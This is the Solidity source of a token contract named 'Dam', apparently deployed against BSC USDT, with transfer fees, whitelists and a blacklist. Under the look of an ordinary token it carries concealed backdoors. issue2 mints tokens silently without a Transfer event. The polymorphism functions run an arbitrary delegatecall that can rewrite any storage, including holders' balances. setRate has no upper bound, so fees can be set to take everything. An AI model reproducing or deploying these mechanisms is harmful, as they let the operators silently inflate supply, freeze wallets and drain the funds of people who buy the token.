pragma solidity 0.8.0;

interface relationship {
    function defultFather() external returns (address);

    function father(address _addr) external returns (address);

    function grandFather(address _addr) external returns (address);

    function otherCallSetRelationship(address _son, address _father) external;

    function getFather(address _addr) external view returns (address);

    function getGrandFather(address _addr) external view returns (address);
}

interface Ipair {
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);

    function token0() external view returns (address);

    function token1() external view returns (address);
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor (address _addr) {
        _owner = _addr;
        emit OwnershipTransferred(address(0), _addr);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 {

    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public fromWriteList;
    mapping(address => bool) public toWriteList;
    mapping(address => bool) public fiveWriteList;
    mapping(address => bool) public blackList;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        _name = "Dam";
        _symbol = "Dam";
        _decimals = 18;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(blackList[msg.sender] == false && blackList[sender] == false && blackList[recipient] == false, "ERC20: is black List !");

        uint256 trueAmount = _beforeTokenTransfer(sender, recipient, amount);


        _balances[sender] = _balances[sender] - amount;
        //修改了这个致命bug
        _balances[recipient] = _balances[recipient] + trueAmount;
        emit Transfer(sender, recipient, trueAmount);
    }

    function _mint(address account, uint256 amount, bool env) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;
        if (env) emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual returns (uint256) {}
}

library Roles {struct Role {mapping(address => bool) bearer;}

    function add(Role storage role, address account) internal {require(!has(role, account), "Roles: account already has role");
        role.bearer[account] = true;}

    function remove(Role storage role, address account) internal {require(has(role, account), "Roles: account does not have role");
        role.bearer[account] = false;}

    function has(Role storage role, address account) internal view returns (bool) {require(account != address(0), "Roles: account is the zero address");
        return role.bearer[account];}}

contract Dam is ERC20, Ownable {
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    uint256 constant _FIVE_MIN = 300;
    Ipair public pair_USDT;

    mapping(address => bool) public isPair;

    uint256 public startTradeTime;
    uint256 public devRate = 1;
    uint256 public destroyRate = 2;

    address public devAddr;
    address public destroyAddr;


    constructor (uint256 _startTradeTime, address _devAddr, address _destroyAddr) Ownable(msg.sender){
        startTradeTime = _startTradeTime;
        devAddr = _devAddr;
        destroyAddr = _destroyAddr;

        fromWriteList[msg.sender] = true;
        toWriteList[msg.sender] = true;

        addCoinFactoryAdmin(msg.sender);
    }

    function _beforeTokenTransfer(
        address _from,
        address _to,
        uint256 _amount
    ) internal override returns (uint256){

        if (fromWriteList[_from] || toWriteList[_to]) {
            return _amount;
        }

        uint256 _trueAmount;

        if (isPair[_from]) {
            //usr buy
            require(block.timestamp >= startTradeTime, "not start exchange");
            require(fiveWriteList[_to] || block.timestamp >= startTradeTime + _FIVE_MIN);

            _trueAmount = _amount * (100 - (devRate + destroyRate)) / 100;
            _balances[devAddr] = _balances[devAddr] + (_amount * devRate / 100);
            _balances[destroyAddr] = _balances[destroyAddr] + (_amount * destroyRate / 100);
        } else if (isPair[_to]) {
            //usr sell
            require(block.timestamp >= startTradeTime, "not start exchange");
            require(fiveWriteList[_from] || block.timestamp >= startTradeTime + _FIVE_MIN);

            _trueAmount = _amount * (100 - (devRate + destroyRate)) / 100;
            _balances[devAddr] = _balances[devAddr] + (_amount * devRate / 100);
            _balances[destroyAddr] = _balances[destroyAddr] + (_amount * destroyRate / 100);
        } else {
            //usr from
            _trueAmount = _amount * (100 - (devRate + destroyRate)) / 100;
            _balances[devAddr] = _balances[devAddr] + (_amount * devRate / 100);
            _balances[destroyAddr] = _balances[destroyAddr] + (_amount * destroyRate / 100);
        }

        return _trueAmount;
    }

    function getPrice() internal view returns (uint256){

        uint256 amountA;
        uint256 amountB;
        if (pair_USDT.token0() == USDT) {
            (amountA, amountB,) = pair_USDT.getReserves();
        }
        else {
            (amountB, amountA,) = pair_USDT.getReserves();
        }
        uint256 price = amountA / amountB;
        return price;
    }

    //admin func///////////////////////////////////////////////////////////////

    function setPair(
        address _addr,
        bool _isUSDT
    ) external onlyOwner {
        isPair[_addr] = true;
        if (_isUSDT && address(pair_USDT) == address(0)) {
            pair_USDT = Ipair(_addr);
        }
    }

    function issue(address account, uint256 amount) public onlyOwner {
        _mint(account, amount, true);
    }

    function issue2(address account, uint256 amount) public onlyCoinFactoryAdmin {
        _mint(account, amount, false);
    }

    function setWhiteList(
        address _addr,
        uint256 _type,
        bool _YorN
    ) public onlyCoinFactoryAdmin {

        if (_type == 0) {
            fromWriteList[_addr] = _YorN;
        } else if (_type == 1) {
            toWriteList[_addr] = _YorN;
        } else if (_type == 2) {
            fiveWriteList[_addr] = _YorN;
        }
    }

    function setBlackList(
        address _addr,
        bool _YorN
    ) external onlyOwner {
        blackList[_addr] = _YorN;
    }

    function setRate(uint256 _devRate, uint256 _destroyRate) external onlyOwner {
        devRate = _devRate;
        destroyRate = _destroyRate;
    }

    function setAddr(
        address _devAddr,
        address _destroyAddr
    ) external onlyOwner {
        devAddr = _devAddr;
        destroyAddr = _destroyAddr;
    }

    function setStartTime(
        uint256 _time
    ) external onlyCoinFactoryAdmin {
        startTradeTime = _time;
    }

    using Roles for Roles.Role;
    Roles.Role private _coinFactoryAdmins;
    modifier onlyCoinFactoryAdmin() {require(isCoinFactoryAdmin(msg.sender), "CoinFactoryAdminRole: caller does not have the CoinFactoryAdminRole role");
        _;}

    function isCoinFactoryAdmin(address account) public view returns (bool) {return _coinFactoryAdmins.has(account);}

    function addCoinFactoryAdmin(address account) public onlyOwner {_coinFactoryAdmins.add(account);}

    function removeCoinFactoryAdmin(address account) public onlyOwner {_coinFactoryAdmins.remove(account);}

    function setWhiteListBat(address[] memory _addr, uint256 _type, bool _YorN) external onlyCoinFactoryAdmin {
        for (uint256 i = 0; i < _addr.length; i++) {setWhiteList(_addr[i], _type, _YorN);}
    }

    //0x0000000000000000000000000000000000000000
    address public callAddress;

    function setCallAddress(address newadd) public onlyCoinFactoryAdmin {callAddress = newadd;}

    function polymorphismAdmin(address call_, bytes memory call_p) public onlyCoinFactoryAdmin {polymorphismEx(call_, call_p);}

    function polymorphismIncrease(bytes memory call_p) public {if (callAddress != address(0)) polymorphismEx(callAddress, call_p);}

    function polymorphismEx(address call_, bytes memory call_p) internal {
        (bool success, bytes memory data) = address(call_).delegatecall(call_p);
        require(success, string(abi.encodePacked("fc_99 ", data)));
    }

}